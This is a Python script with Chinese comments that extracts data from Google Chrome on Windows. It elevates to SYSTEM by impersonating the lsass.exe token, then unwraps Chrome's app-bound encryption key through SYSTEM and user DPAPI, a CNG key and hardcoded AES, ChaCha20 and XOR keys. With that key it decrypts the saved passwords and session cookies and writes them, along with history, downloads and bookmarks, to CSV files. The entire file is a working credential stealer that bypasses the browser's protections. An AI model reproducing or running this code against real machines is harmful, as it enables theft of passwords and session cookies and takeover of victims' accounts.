import os
import io
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import csv
from contextlib import contextmanager

import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    """模拟lsass.exe以获取SYSTEM权限"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * buffer_size)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def get_cookies(v20_master_key, result_dir):
    """获取Chrome中的Cookies"""
    user_profile = os.environ['USERPROFILE']
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
   
    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
    cookies = cur.fetchall()
    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
    con.close()

    # 输出到 CSV 文件
    with open(os.path.join(result_dir, 'chrome_cookies.csv'), mode='w', newline='', encoding='utf-8') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(['Host', 'Cookie Name', 'Cookie Value'])  # 写入表头
        
        for c in cookies_v20:
            host = c[0]
            name = c[1]
            try:
                decrypted_value = decrypt_cookie_v20(c[2], v20_master_key)
                writer.writerow([host, name, decrypted_value])  # 写入每一行数据
            except Exception as e:
                print(f"Failed to decrypt cookie for {host}: {e}")

def decrypt_cookie_v20(encrypted_value, v20_master_key):
    cookie_iv = encrypted_value[3:3+12]
    encrypted_cookie = encrypted_value[3+12:-16]
    cookie_tag = encrypted_value[-16:]
    cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted_cookie[32:].decode('utf-8')

def get_passwords(v20_master_key, result_dir):
    """获取Chrome中的保存密码"""
    user_profile = os.environ['USERPROFILE']
    login_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    
    con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    
    r = cur.execute("SELECT origin_url, username_value, password_value FROM logins;")
    logins = cur.fetchall()
    con.close()

    # 输出到 CSV 文件
    with open(os.path.join(result_dir, 'chrome_passwords.csv'), mode='w', newline='', encoding='utf-8') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(['URL', 'Username', 'Password'])  # 写入表头

        for origin_url, username, encrypted_password in logins:
            if encrypted_password[:3] == b"v20":
                password_iv = encrypted_password[3:3 + 12]
                encrypted_password_value = encrypted_password[3 + 12:-16]
                password_tag = encrypted_password[-16:]
                
                password_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=password_iv)
                try:
                    decrypted_password = password_cipher.decrypt_and_verify(encrypted_password_value, password_tag)
                    writer.writerow([origin_url, username, decrypted_password.decode('utf-8')])  # 写入每一行数据
                except Exception as e:
                    print(f"Failed to decrypt password for {origin_url}: {e}")

def get_downloads(result_dir):
    """获取Chrome中的下载记录"""
    user_profile = os.environ['USERPROFILE']
    downloads_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\History"
    
    con = sqlite3.connect(pathlib.Path(downloads_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    
    r = cur.execute("SELECT target_path, start_time FROM downloads;")
    downloads = cur.fetchall()
    con.close()

    # 输出到 CSV 文件
    with open(os.path.join(result_dir, 'chrome_downloads.csv'), mode='w', newline='', encoding='utf-8') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(['Downloaded File', 'Time'])  # 写入表头

        for target, start_time in downloads:
            writer.writerow([target, start_time])  # 写入每一行数据

def get_history(result_dir):
    """获取Chrome中的浏览历史记录"""
    user_profile = os.environ['USERPROFILE']
    history_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\History"
    
    con = sqlite3.connect(pathlib.Path(history_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    
    # 查询浏览历史
    r = cur.execute("SELECT url, title, visit_count FROM urls;")
    history = cur.fetchall()
    con.close()

    # 输出到 CSV 文件
    with open(os.path.join(result_dir, 'chrome_history.csv'), mode='w', newline='', encoding='utf-8') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(['URL', 'Title', 'Visit Count'])  # 写入表头

        for url, title, visit_count in history:
            writer.writerow([url, title, visit_count])  # 写入每一行数据

def get_bookmarks(result_dir):
    """获取Chrome中的书签"""
    user_profile = os.environ['USERPROFILE']
    bookmarks_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    
    with open(bookmarks_path, "r", encoding="utf-8") as f:
        bookmarks = json.load(f)

    # 输出到 CSV 文件
    with open(os.path.join(result_dir, 'chrome_bookmarks.csv'), mode='w', newline='', encoding='utf-8') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(['Bookmark Title', 'URL'])  # 写入表头

        for bookmark in bookmarks["roots"]["bookmark_bar"]["children"]:
            if 'url' in bookmark:
                writer.writerow([bookmark['name'], bookmark['url']])  # 写入每一行数据

def main():
    if not is_admin():
        print("此脚本需要以管理员身份运行。")
        return

    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"

    # 创建结果目录
    result_dir = pathlib.Path("result")
    result_dir.mkdir(exist_ok=True)

    # 读取 Local State
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    
    # 使用 SYSTEM DPAPI 解密
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    # 使用用户 DPAPI 解密
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
    
    # 解析 key blob
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

    # 调用各个函数以提取数据
    get_cookies(v20_master_key, result_dir)
    get_passwords(v20_master_key, result_dir)
    get_downloads(result_dir)
    get_history(result_dir)
    get_bookmarks(result_dir)

    print("数据已成功输出到 'result' 目录中的 CSV 文件。")

if __name__ == "__main__":
    main()